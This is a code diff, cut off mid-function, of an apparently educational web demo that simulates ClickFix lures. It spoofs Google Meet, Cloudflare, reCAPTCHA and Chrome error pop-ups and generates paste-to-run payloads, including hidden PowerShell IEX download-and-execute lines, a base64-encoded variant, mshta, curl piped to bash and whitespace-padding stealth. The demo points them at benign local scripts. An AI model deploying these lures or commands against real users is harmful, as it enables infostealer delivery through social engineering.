@@ -10,112 +10,198 @@ const SAFE_SCRIPT_UNIX = `${baseUrl}/static/example.sh`;
 
 <div class="demo-wrapper" id="interactive-demo" data-base-url={baseUrl}>
   <!-- Controls -->
-  <div class="demo-controls card">
+  <div class="demo-controls">
     <div class="control-group">
       <label for="scenario-select">Lure Scenario:</label>
-      <select id="scenario-select">
-        <option value="meet">Google Meet (Connection Error)</option>
-        <option value="captcha">Fake CAPTCHA (Verify Human)</option>
-        <option value="browser">Browser Update (Security Fix)</option>
-        <option value="filefix">FileFix (Explorer Error)</option>
-      </select>
+      <div class="select-wrapper">
+        <select id="scenario-select">
+          <option value="meet">Google Meet (Connection Error)</option>
+          <option value="cloudflare">Cloudflare (Verify Human)</option>
+          <option value="recaptcha">ReCAPTCHA (I'm not a robot)</option>
+          <option value="browser">Browser Error (Chrome Update)</option>
+        </select>
+        <svg class="select-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
+          <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd" />
+        </svg>
+      </div>
     </div>
 
     <div class="control-group">
-      <label for="platform-select">Platform:</label>
-      <select id="platform-select">
-        <option value="windows">Windows (PowerShell)</option>
-        <option value="mac">macOS (Terminal)</option>
-        <option value="linux">Linux (Bash)</option>
-      </select>
+      <label for="platform-select">Target Platform:</label>
+      <div class="select-wrapper">
+        <select id="platform-select">
+          <option value="windows">Windows (PowerShell/Run)</option>
+          <option value="unix">macOS / Linux (Terminal)</option>
+        </select>
+        <svg class="select-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
+          <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd" />
+        </svg>
+      </div>
     </div>
 
     <div class="control-group">
-      <label for="tech-level-select">Obfuscation Level:</label>
-      <select id="tech-level-select">
-        <option value="1">Level 1: Clear Text (Basic)</option>
-        <option value="2">Level 2: Obfuscated (Base64/Hidden)</option>
-        <option value="3">Level 3: Stealth (Padding/Tricks)</option>
-      </select>
+      <label for="variant-select">Payload Variant:</label>
+      <div class="select-wrapper">
+        <select id="variant-select">
+          <!-- Populated by JS based on platform -->
+        </select>
+        <svg class="select-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
+          <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd" />
+        </svg>
+      </div>
     </div>
   </div>
 
   <!-- Simulation Stage -->
-  <div class="demo-stage card" id="demo-stage-1">
+  <div class="demo-stage" id="demo-stage-1">
     
-    <!-- Scenario: Google Meet -->
+    <!-- Scenario: Google Meet (Dark Mode) -->
     <div class="scenario-ui hidden" id="ui-meet">
-      <div class="fake-notification meet-style">
-        <div class="notif-header">
-          <img src="https://www.google.com/favicon.ico" alt="Google" width="16" height="16" />
-          <span>Google Meet</span>
+      <div class="meet-wrapper">
+        <div class="meet-header">
+           <div class="meet-logo-area">
+             <img src="https://www.gstatic.com/meet/google_meet_horizontal_wordmark_2020q4_1x_icon_124_40_2373e79660dabbf194273d27aa7ee1f5.png" alt="Google Meet" height="24" />
+           </div>
         </div>
-        <div class="notif-body">
-          <h4>Connection Error</h4>
-          <p>A technical issue occurred. Please fix to join the meeting:</p>
-          <div class="fake-instruction" id="instr-meet"></div>
-          <button class="btn-fake-copy action-btn">Fix Connection</button>
+        <div class="meet-body">
+            <div class="meet-main-content">
+                <div class="meet-video-placeholder">
+                    <div class="meet-video-text">No camera found</div>
+                    <div class="meet-controls">
+                        <div class="meet-btn-circle red"></div>
+                        <div class="meet-btn-circle red"></div>
+                    </div>
+
+                    <!-- The Lure Popup -->
+                    <div class="meet-popup">
+                        <div class="meet-popup-header">
+                            <span class="meet-bell-icon">🔔</span> Problems detected
+                            <span class="meet-popup-menu">⋮</span>
+                        </div>
+                        <div class="meet-popup-body">
+                            <p>Problems have been detected with your microphone and headset. Click <strong>Fix it</strong> button and follow steps.</p>
+                            <div class="meet-actions">
+                                <button class="btn-meet-fix btn-fake-copy">Fix it</button>
+                                <button class="btn-meet-try-again">Try again</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Step 2 Popup (Hidden initially) -->
+                    <div class="meet-popup hidden" id="meet-step-2">
+                        <div class="meet-popup-header">
+                            <span class="meet-bell-icon">🔔</span> Problems detected
+                        </div>
+                        <div class="meet-popup-body">
+                            <div class="instruction-text instruction-meet"></div>
+                            <div class="meet-actions">
+                                <button class="btn-meet-fix btn-fake-copy">Copy Fix</button>
+                                <button class="btn-meet-try-again">Try again</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="meet-sidebar">
+                   <h3>Ready to join?</h3>
+                   <button class="meet-join-btn">Join now</button>
+                </div>
+            </div>
         </div>
       </div>
     </div>
 
-    <!-- Scenario: Fake CAPTCHA -->
-    <div class="scenario-ui hidden" id="ui-captcha">
-      <div class="fake-captcha captcha-style">
-        <div class="captcha-box">
-          <input type="checkbox" id="fake-checkbox" />
-          <label for="fake-checkbox">I'm not a robot</label>
-          <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" class="captcha-logo"/>
-        </div>
-        <div class="captcha-instructions hidden" id="captcha-step-2">
-           <p><strong>Verification Steps:</strong></p>
-           <div class="fake-instruction" id="instr-captcha"></div>
-           <button class="btn-fake-copy action-btn">Verify Now</button>
-        </div>
+    <!-- Scenario: Cloudflare (Human Verify) -->
+    <div class="scenario-ui hidden" id="ui-cloudflare">
+      <div class="cloudflare-wrapper">
+          <div class="cloudflare-header">
+              <div class="cf-left">Verifying you are human</div>
+              <div class="cf-logo">CLOUDFLARE</div>
+          </div>
+          <div class="cloudflare-body">
+             <div class="cf-step" id="cf-step-1">
+                 <p class="cf-subtext">This may take a few seconds</p>
+                 <div class="cf-checkbox-row">
+                    <input type="checkbox" id="cf-check" class="cf-checkbox" />
+                    <label for="cf-check">Verify you are human</label>
+                 </div>
+                 <div class="cf-loading hidden" id="cf-loading">
+                    <div class="spinner"></div> Verifying...
+                 </div>
+             </div>
+
+             <div class="cf-instructions hidden" id="cf-step-2">
+                 <div class="cf-instruction-box">
+                    <div class="instruction-text instruction-cf"></div>
+                    <button class="cf-copy-btn btn-fake-copy">Copy Verification</button>
+                 </div>
+             </div>
+          </div>
       </div>
     </div>
 
-    <!-- Scenario: Browser Update -->
+    <!-- Scenario: ReCAPTCHA -->
+    <div class="scenario-ui hidden" id="ui-recaptcha">
+      <div class="recaptcha-wrapper">
+         <div class="recaptcha-box">
+             <div class="rc-checkbox-area">
+                <input type="checkbox" id="rc-check" class="rc-checkbox" />
+                <label for="rc-check">I'm not a robot</label>
+             </div>
+             <div class="rc-logo-area">
+                 <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="" width="32" height="32" />
+                 <div class="rc-text">reCAPTCHA</div>
+                 <div class="rc-links">Privacy - Terms</div>
+             </div>
+         </div>
+         
+         <div class="rc-instructions hidden" id="rc-step-2">
+             <p class="rc-verify-title">Verification Steps:</p>
+             <div class="instruction-text instruction-rc"></div>
+             <button class="rc-verify-btn btn-fake-copy">Verify</button>
+         </div>
+      </div>
+    </div>
+
+    <!-- Scenario: Browser Update (Chrome) -->
     <div class="scenario-ui hidden" id="ui-browser">
-        <div class="browser-alert">
-            <div class="alert-icon">⚠️</div>
-            <div class="alert-content">
-                <h3>Security Update Required</h3>
-                <p>Your browser is missing a critical security patch (CVE-2025-X).</p>
-                <div class="fake-instruction" id="instr-browser"></div>
-                <button class="btn-fake-copy action-btn">Update Now</button>
+        <div class="chrome-alert">
+            <div class="chrome-header">
+                <!-- Chrome Logo Icon -->
+                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_%28February_2022%29.svg" alt="Chrome" width="24" height="24" style="margin-right: 8px;" />
+                <strong>Google Chrome</strong>
             </div>
-        </div>
-    </div>
+            <div class="chrome-body">
+                <h3>Something went wrong while displaying this webpage.</h3>
+                <p>There was an error during the latest update of browser version, causing some web pages to malfunction.</p>
+                
+                <div class="chrome-steps">
+                    <p><strong>Follow these instructions to resolve the issue:</strong></p>
+                    <div class="instruction-text instruction-browser" style="margin-left: 1rem; line-height: 1.6;"></div>
+                </div>
 
-    <!-- Scenario: FileFix -->
-    <div class="scenario-ui hidden" id="ui-filefix">
-        <div class="explorer-window">
-            <div class="explorer-bar">
-                <span>📁 This PC > Documents > Secret.pdf</span>
-            </div>
-            <div class="explorer-body">
-                <div class="error-dialog">
-                    <h5>File System Error</h5>
-                    <p>File cannot be displayed. Paste the fix below into the address bar.</p>
-                    <div class="fake-instruction" id="instr-filefix"></div>
-                    <button class="btn-fake-copy action-btn">Copy Fix Path</button>
+                <div class="chrome-actions">
+                    <button class="chrome-btn-blue btn-fake-copy">Copy fix</button>
+                    <button class="chrome-btn-grey">Close</button>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Explanation Box -->
+    <!-- Explanation Box (Bottom) -->
     <div class="demo-explanation hidden" id="explanation-box">
-        <h4>🚨 What just happened?</h4>
-        <p>You copied this <strong>SAFE</strong> educational command:</p>
+        <div class="expl-header">
+          <h4>🚨 Simulation: What was copied to your clipboard?</h4>
+          <button id="close-expl" class="close-expl">×</button>
+        </div>
+        <p>If you were a victim, you would have just pasted this malicious command:</p>
         <div class="payload-display">
             <code id="payload-code"></code>
         </div>
         <div class="alert-box">
-            <strong>⚠️ Reality Check:</strong> If this were real malware, it would have just stolen your passwords.
-            <br>
-            <em id="safe-note" style="font-size: 0.9em; color: #059669;">(Note: The command above mimics real techniques but runs a harmless localized script.)</em>
+            <strong>⚠️ Reality Check:</strong> The command above executes a hidden script. <br/>
+            In this demo, it runs a <strong>benign local file</strong> (`example.ps1` or `example.sh`). <br/>
+            In a real attack, this would install infostealers like Lumma or RedLine immediately.
         </div>
     </div>
 
@@ -123,353 +209,684 @@ const SAFE_SCRIPT_UNIX = `${baseUrl}/static/example.sh`;
 </div>
 
 <style>
+  /* Base Layout */
   .demo-wrapper {
-    max-width: 900px;
+    max-width: 1000px;
     margin: 0 auto;
+    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
   }
   
+  .hidden { display: none !important; }
+
+  /* Controls */
   .demo-controls {
     display: flex;
     flex-wrap: wrap;
-    gap: 1.5rem;
+    gap: 1rem;
     padding: 1.5rem;
-    margin-bottom: 2rem;
-    background: #f8fafc;
-    border: 1px solid #e2e8f0;
-  }
-
-  .control-group {
-    flex: 1;
-    min-width: 200px;
-  }
-  
-  .control-group label {
-    display: block;
-    font-size: 0.85rem;
-    font-weight: 600;
-    margin-bottom: 0.5rem;
-    color: #475569;
-  }
-  
-  select {
-    width: 100%;
-    padding: 0.5rem;
-    border: 1px solid #cbd5e1;
-    border-radius: 4px;
     background: white;
+    border: 1px solid #e5e7eb;
+    border-radius: 8px;
+    margin-bottom: 2rem;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+  }
+  .control-group { flex: 1; min-width: 200px; }
+  .control-group label {
+      display: block;
+      font-size: 0.8rem;
+      font-weight: 700;
+      color: #374151;
+      margin-bottom: 0.4rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+  }
+  .select-wrapper { position: relative; }
+  select {
+      width: 100%;
+      padding: 0.6rem 2.5rem 0.6rem 0.8rem;
+      border: 1px solid #d1d5db;
+      border-radius: 6px;
+      background: #f9fafb;
+      font-size: 0.95rem;
+      color: #111827;
+      appearance: none;
+      cursor: pointer;
+  }
+  select:focus { outline: 2px solid #2563eb; border-color: #2563eb; }
+  .select-icon {
+      position: absolute;
+      right: 0.8rem;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 1.25rem;
+      height: 1.25rem;
+      color: #6b7280;
+      pointer-events: none;
   }
 
+  /* Stage */
   .demo-stage {
-    padding: 3rem;
-    min-height: 400px;
+    min-height: 500px;
     display: flex;
     flex-direction: column;
     align-items: center;
-    justify-content: flex-start;
-  }
-
-  .scenario-ui {
-    width: 100%;
-    max-width: 500px;
-    margin-bottom: 2rem;
-  }
-
-  .hidden { display: none !important; }
-
-  /* Google Meet Style */
-  .meet-style {
-    background: white;
-    border-radius: 8px;
-    box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
-    overflow: hidden;
-    border: 1px solid #e5e7eb;
-  }
-  .notif-header {
-    background: #f1f3f4;
-    padding: 0.75rem 1rem;
-    display: flex;
-    align-items: center;
-    gap: 0.5rem;
-    font-weight: 500;
-    font-size: 0.9rem;
-  }
-  .notif-body { padding: 1.5rem; }
-  .notif-body h4 { color: #d93025; margin: 0 0 1rem 0; font-size: 1.1rem; }
-
-  /* CAPTCHA Style */
-  .captcha-style {
-    background: #f9f9f9;
-    border: 1px solid #d3d3d3;
-    padding: 1rem;
-    border-radius: 4px;
-    width: 300px;
-    margin: 0 auto;
-    background: white;
-    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-  }
-  .captcha-box {
-    display: flex;
-    align-items: center;
-    gap: 1rem;
-    padding: 0.5rem;
-  }
-  .captcha-logo { width: 48px; height: 48px; margin-left: auto; }
-  .captcha-instructions {
-    margin-top: 1rem;
-    border-top: 1px solid #eee;
-    padding-top: 1rem;
-  }
-
-  /* Browser Alert Style */
-  .browser-alert {
-    background: #fff4f4;
-    border: 1px solid #fecaca;
-    border-radius: 6px;
-    padding: 1.5rem;
-    display: flex;
-    gap: 1rem;
-  }
-  .alert-icon { font-size: 2rem; }
-  .alert-content h3 { margin: 0 0 0.5rem 0; color: #991b1b; }
-
-  /* Explorer Style */
-  .explorer-window {
-    border: 1px solid #94a3b8;
-    background: white;
-    border-radius: 4px;
-    overflow: hidden;
-    box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
-  }
-  .explorer-bar {
-    background: #f1f5f9;
-    padding: 0.5rem;
-    font-size: 0.85rem;
-    border-bottom: 1px solid #cbd5e1;
-    color: #475569;
-  }
-  .explorer-body {
+    position: relative;
     padding: 2rem;
-    background: #ffffff;
-    display: flex;
-    justify-content: center;
+    background: #f3f4f6; /* Neutral background for stage */
+    border-radius: 12px;
+    border: 1px dashed #cbd5e1;
   }
-  .error-dialog {
-    border: 1px solid #cbd5e1;
-    padding: 1.5rem;
-    background: #f8fafc;
-    width: 100%;
+  .scenario-ui { width: 100%; max-width: 900px; }
+
+  /** 
+   * SCENARIO: GOOGLE MEET (Dark Mode)
+   */
+  .meet-wrapper {
+      background: #202124;
+      color: white;
+      height: 500px;
+      display: flex;
+      flex-direction: column;
+      border-radius: 8px;
+      overflow: hidden;
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+  }
+  .meet-header {
+      padding: 0.8rem 1.5rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+  }
+  .meet-body {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+  }
+  .meet-main-content {
+      display: flex;
+      gap: 2rem;
+      width: 100%;
+      max-width: 900px;
+      align-items: center;
+  }
+  .meet-video-placeholder {
+     flex: 2;
+     background: #3c4043;
+     border-radius: 8px;
+     height: 350px;
+     position: relative;
+     display: flex;
+     align-items: center;
+     justify-content: center;
+     flex-direction: column;
+  }
+  .meet-video-text { font-size: 1.2rem; color: #e8eaed; margin-bottom: 2rem; }
+  .meet-controls { display: flex; gap: 1rem; }
+  .meet-btn-circle {
+      width: 40px; height: 40px; border-radius: 50%;
+      background: #ea4335; /* Red mute buttons */
+      opacity: 0.8;
+  }
+  
+  /* LURE POPUP */
+  .meet-popup {
+      position: absolute;
+      bottom: 20px;
+      right: 20px;
+      background: white;
+      color: #202124;
+      width: 320px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+      z-index: 10;
+      animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+  .meet-popup-header {
+      padding: 12px 16px;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #dadce0;
+      font-size: 0.95rem;
+  }
+  #meet-step-2 .meet-popup-header {
+      justify-content: center;
+  }
+  .meet-bell-icon { margin-right: 8px; }
+  .meet-popup-menu { color: #5f6368; cursor: pointer; }
+  .meet-popup-body { padding: 16px; font-size: 0.9rem; line-height: 1.5; }
+  .meet-actions {
+      margin-top: 16px;
+      display: flex;
+      gap: 8px;
+      justify-content: flex-end;
+  }
+  .btn-meet-fix {
+      background: transparent;
+      color: #1a73e8;
+      border: none;
+      font-weight: 500;
+      cursor: pointer;
+      padding: 8px 16px;
+  }
+  .btn-meet-fix:hover { background: #f1f3f4; border-radius: 4px; }
+  .btn-meet-try-again {
+      background: transparent;
+      color: #1a73e8;
+      border: none;
+      font-weight: 500;
+      cursor: pointer;
+      padding: 8px 16px;
+  }
+  
+  .meet-sidebar {
+      flex: 1;
+      color: #e8eaed;
+      text-align: center;
+  }
+  .meet-sidebar h3 { font-size: 1.7rem; font-weight: 400; margin-bottom: 2rem; }
+  .meet-join-btn {
+      background: #8ab4f8;
+      color: #202124;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 24px;
+      font-weight: 500;
+      font-size: 1rem;
+      cursor: pointer;
   }
 
-  /* Shared Utility Styles */
-  .fake-instruction {
-    background: #1e293b;
-    color: #e2e8f0;
-    padding: 1rem;
-    border-radius: 4px;
-    margin: 1rem 0;
-    font-family: monospace;
-    font-size: 0.85rem;
-    text-align: left;
+  /**
+   * SCENARIO: CLOUDFLARE
+   */
+  .cloudflare-wrapper {
+      background: white;
+      max-width: 500px;
+      margin: 0 auto;
+      box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -1px rgba(0,0,0,0.06);
+      border-radius: 4px;
+      overflow: hidden;
+      font-family: system-ui, -apple-system, sans-serif;
   }
-  .action-btn {
-    width: 100%;
-    padding: 0.75rem;
-    background: #2563eb;
-    color: white;
-    border: none;
-    border-radius: 4px;
-    font-weight: 600;
-    cursor: pointer;
+  .cloudflare-header {
+      background: #f48120; /* Cloudflare Orange */
+      color: white;
+      padding: 1rem 1.5rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
   }
-  .action-btn:hover { background: #1d4ed8; }
+  .cf-left { font-weight: 600; font-size: 1.1rem; }
+  .cf-logo { font-weight: 800; font-size: 0.9rem; letter-spacing: 0.05em; }
+  .cloudflare-body { padding: 2rem; }
+  .cf-subtext { color: #4b5563; margin-bottom: 1.5rem; font-size: 0.95rem; }
+  
+  .cf-checkbox-row {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      padding: 1rem;
+      background: #f9fafb;
+      border: 1px solid #e5e7eb;
+      border-radius: 4px;
+      margin-bottom: 1rem;
+  }
+  .cf-checkbox { width: 24px; height: 24px; cursor: pointer; }
+  .cf-checkbox-row label { font-size: 1.1rem; color: #374151; cursor: pointer; }
+  
+  .cf-instruction-box {
+      background: #fff7ed;
+      border: 1px solid #fdba74;
+      padding: 1rem;
+      border-radius: 6px;
+      animation: fadeIn 0.3s;
+  }
 
+  .cf-copy-btn {
+      width: 100%;
+      background: #f48120;
+      color: white;
+      border: none;
+      padding: 0.75rem;
+      font-weight: 600;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 1rem;
+  }
+  .cf-copy-btn:hover { background: #ea580c; }
+
+  /**
+   * SCENARIO: RECAPTCHA
+   */
+   /**
+   * SCENARIO: RECAPTCHA
+   */
+   .recaptcha-wrapper {
+       margin: 0 auto;
+       font-family: Roboto, Arial, sans-serif;
+       display: flex;
+       flex-direction: column;
+       align-items: center;
+       justify-content: center;
+   }
+   
+   .recaptcha-box {
+       background: #f9f9f9;
+       border: 1px solid #d3d3d3;
+       border-radius: 3px;
+       width: 304px;
+       height: 78px;
+       display: flex;
+       align-items: center;
+       justify-content: space-between;
+       box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
+       padding: 0 12px;
+       box-sizing: border-box;
+       background: #fff;
+   }
+   
+   .rc-checkbox-area {
+       display: flex;
+       align-items: center;
+       gap: 12px;
+   }
+   .rc-checkbox {
+       width: 24px;
+       height: 24px;
+       cursor: pointer;
+       border: 2px solid #c1c1c1;
+       border-radius: 2px;
+   }
+   .rc-checkbox:hover { border-color: #b2b2b2; }
+   
+   .rc-checkbox-area label {
+       font-family: Roboto, Arial, sans-serif;
+       font-weight: 400;
+       font-size: 14px;
+       color: #000;
+       cursor: pointer;
+   }
+   
+   .rc-logo-area {
+       display: flex;
+       flex-direction: column;
+       align-items: center;
+       text-align: center;
+       margin-right: 2px;
+   }
+   .rc-text {
+       font-size: 10px;
+       color: #555;
+       margin-top: 2px;
+   }
+   .rc-links {
+       font-size: 8px;
+       color: #555;
+       margin-top: 1px;
+   }
+   
+   .rc-instructions {
+       margin-top: 1.5rem;
+       border: 1px solid #e0e0e0;
+       padding: 1rem;
+       border-radius: 4px;
+       background: white;
+       animation: fadeIn 0.3s;
+       max-width: 400px;
+       margin-left: auto;
+       margin-right: auto;
+   }
+   .rc-verify-title { font-weight: bold; margin-bottom: 0.5rem; color: #333; }
+   .rc-verify-btn {
+       width: 100%;
+       background: #4a90e2;
+       color: white;
+       border: none;
+       padding: 0.75rem;
+       font-weight: 600;
+       border-radius: 3px;
+       cursor: pointer;
+       margin-top: 1rem;
+   }
+   .rc-verify-btn:hover { background: #357abd; }
+
+
+  /**
+   * SCENARIO: CHROME BROWSER ERROR
+   */
+  .chrome-alert {
+      background: white;
+      width: 100%;
+      max-width: 600px;
+      margin: 0 auto;
+      border-radius: 8px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  }
+  .chrome-header {
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-bottom: 1px solid #e5e7eb;
+  }
+  .chrome-header strong { color: #374151; font-size: 0.9rem; }
+  
+  .chrome-body { padding: 30px 40px; }
+  .chrome-body h3 { 
+      font-size: 1.5rem; color: #1f2937; margin: 0 0 1rem 0; font-weight: 600;
+  }
+  .chrome-body p { color: #4b5563; margin-bottom: 1.5rem; font-size: 0.95rem; line-height: 1.5; }
+  
+  .chrome-steps {
+      background: #f8fafc;
+      padding: 1.5rem;
+      border-radius: 6px;
+      margin-bottom: 2rem;
+  }
+  
+  .chrome-actions {
+      display: flex;
+      gap: 1rem;
+      justify-content:flex-end;
+  }
+  .chrome-btn-blue {
+      background: #1a73e8;
+      color: white;
+      padding: 10px 24px;
+      border-radius: 20px;
+      border: none;
+      font-weight: 500;
+      cursor: pointer;
+  }
+  .chrome-btn-blue:hover { background: #1557b0; }
+  .chrome-btn-grey {
+      background: white;
+      color: #1a73e8;
+      border: 1px solid #dadce0;
+      padding: 10px 24px;
+      border-radius: 20px;
+      font-weight: 500;
+      cursor: pointer;
+  }
+  .chrome-btn-grey:hover { background: #f1f3f4; }
+
+  /* Explanation / Payload Display */
   .demo-explanation {
-    margin-top: 2rem;
-    width: 100%;
-    border-top: 2px dashed #cbd5e1;
-    padding-top: 2rem;
-    animation: fadeIn 0.5s ease-out;
+      width: 100%;
+      background: white;
+      margin-top: 2rem;
+      border-radius: 8px;
+      padding: 1.5rem;
+      box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
+      border-left: 5px solid #ef4444;
+      animation: slideUp 0.5s ease-out;
   }
+  .expl-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; }
+  .expl-header h4 { margin: 0; color: #991b1b; font-size: 1.1rem; }
+  .close-expl { background: none; border: none; font-size: 1.5rem; cursor: pointer; color: #9ca3af; }
+  
   .payload-display {
-    background: #111827;
-    padding: 1rem;
-    border-radius: 6px;
-    color: #10b981;
-    font-family: monospace;
-    word-break: break-all;
-    margin: 1rem 0;
-    font-size: 0.85rem;
-    overflow-x: auto;
+      background: #111827;
+      border-radius: 6px;
+      padding: 1rem;
+      color: #34d399;
+      font-family: monospace;
+      font-size: 0.85rem;
+      overflow-x: auto;
+      margin: 1rem 0;
+      word-break: break-all;
   }
   .payload-display code {
-    font-family: "Courier New", monospace;
-    font-size: 0.85rem;
-    color: #10b981;
-    word-break: keep-all;
-    white-space: pre;
-    color: var(--accent-color);
-    margin-top: 0;
+      background: transparent;
+      padding: 0;
+      color: inherit;
   }
   .alert-box {
-    background: #fecaca;
-    color: #991b1b;
-    padding: 1rem;
-    border-radius: 6px;
-    border: 1px solid #fca5a5;
+      font-size: 0.9rem;
+      color: #4b5563;
+      background: #fee2e2;
+      padding: 1rem;
+      border-radius: 6px;
   }
 
+  @keyframes slideUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+  }
   @keyframes fadeIn {
-    from { opacity: 0; transform: translateY(10px); }
-    to { opacity: 1; transform: translateY(0); }
+      from { opacity: 0; } to { opacity: 1; }
   }
 </style>
 
-<script define:vars={{ SAFE_SCRIPT_WIN, SAFE_SCRIPT_UNIX }}>
-  // State
-  let state = {
+<script define:vars={{ SAFE_SCRIPT_WIN, SAFE_SCRIPT_UNIX, baseUrl }}>
+  // Application State
+  const state = {
     scenario: 'meet',
     platform: 'windows',
-    level: '1'
+    variant: 'powershell-hidden' // default
   };
 
   // DOM Elements
   const els = {
     scenarioSelect: document.getElementById('scenario-select'),
     platformSelect: document.getElementById('platform-select'),
-    levelSelect: document.getElementById('tech-level-select'),
+    variantSelect: document.getElementById('variant-select'),
     scenarios: {
       meet: document.getElementById('ui-meet'),
-      captcha: document.getElementById('ui-captcha'),
-      browser: document.getElementById('ui-browser'),
-      filefix: document.getElementById('ui-filefix')
+      cloudflare: document.getElementById('ui-cloudflare'),
+      recaptcha: document.getElementById('ui-recaptcha'),
+      browser: document.getElementById('ui-browser')
     },
     instr: {
-      meet: document.getElementById('instr-meet'),
-      captcha: document.getElementById('instr-captcha'),
-      browser: document.getElementById('instr-browser'),
-      filefix: document.getElementById('instr-filefix')
+        all: document.querySelectorAll('.instruction-text')
     },
     explBox: document.getElementById('explanation-box'),
     payloadCode: document.getElementById('payload-code'),
-    fakeCheckbox: document.getElementById('fake-checkbox'),
-    captchaStep2: document.getElementById('captcha-step-2'),
-    copyBtns: document.querySelectorAll('.btn-fake-copy')
+    closeExplBtn: document.getElementById('close-expl'),
+    
+    // Scenario specific
+    meetStep1: document.querySelector('.meet-popup:not(#meet-step-2)'),
+    meetStep2: document.getElementById('meet-step-2'),
+    cfStep2: document.getElementById('cf-step-2'),
+    cfLoading: document.getElementById('cf-loading'),
+    cfCheck: document.getElementById('cf-check'),
+    rcStep2: document.getElementById('rc-step-2'),
+    rcCheck: document.getElementById('rc-check')
   };
 
-  // Logic to build the payload
-  function getPayload() {
-    const isWin = state.platform === 'windows';
-    const level = parseInt(state.level);
+  // Payload Definitions
+  const variants = {
+    windows: [
+      { id: 'powershell-hidden', label: 'PowerShell (Hidden Window)' },
+      { id: 'powershell-enc', label: 'PowerShell (Base64 Encoded)' },
+      { id: 'mshta', label: 'mshta (HTML Application)' },
+      { id: 'batch', label: 'Batch / Command Prompt' }
+    ],
+    unix: [
+      { id: 'curl-basic', label: 'Curl (Basic)' },
+      { id: 'base64-pipe', label: 'Base64 Pipeline' },
+      { id: 'stealth-obf', label: 'Stealth (Character Obfuscation)' }
+    ]
+  };
+
+  // --- Logic ---
+
+  function detectOS() {
+    const ua = navigator.userAgent.toLowerCase();
+    if (ua.includes('mac') || ua.includes('linux')) return 'unix';
+    return 'windows';
+  }
+
+  function getTypeInstruction() {
+      if (state.platform === 'windows') return `1. Press <strong>Windows Key + R</strong><br>2. Press <strong>Ctrl + V</strong><br>3. Press <strong>Enter</strong>`;
+      // Combined Mac/Unix instruction
+      return `1. Open Terminal (Cmd + Space, type "Terminal")<br>2. Paste Command (Cmd + V)<br>3. Press Enter`;
+  }
+
+  function getPayloadCode() {
+    const v = state.variant;
     
-    // Windows Payloads
-    if (isWin) {
-      const basicCmd = `powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('${SAFE_SCRIPT_WIN}')"`;
-      
-      if (level === 1) return basicCmd;
-      
-      if (level === 2) {
-        // Simple Base64 Obfuscation
-        const bytes = new TextEncoder().encode(basicCmd);
-        const b64 = btoa(String.fromCharCode(...bytes));
+    // Windows Variants
+    if (v === 'powershell-hidden') {
+        return `powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('${SAFE_SCRIPT_WIN}')"`;
+    }
+    if (v === 'powershell-enc') {
+        const cmd = `IEX(New-Object Net.WebClient).DownloadString('${SAFE_SCRIPT_WIN}')`;
+        const b64 = btoa(cmd.split('').map(c => c.charCodeAt(0)).join('')); // Simple mock b64
         return `powershell -Enc ${b64}`;
-      }
-      
-      if (level === 3) {
-        // "Stealth" padding - simulating whitespace padding
-        return `powershell                                                                                                                                                                                                                                                                                                                                                                                          -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('${SAFE_SCRIPT_WIN}')"`;
-      }
-    } 
-    // Mac/Linux Payloads
-    else {
-      const basicCmd = `curl -s ${SAFE_SCRIPT_UNIX} | bash`;
-      
-      if (level === 1) return basicCmd;
-      
-      if (level === 2) {
-        // Base64 pipeline
-        const b64 = btoa(basicCmd);
+    }
+    if (v === 'mshta') {
+        return `mshta "${baseUrl}/static/fake-error.hta"`;
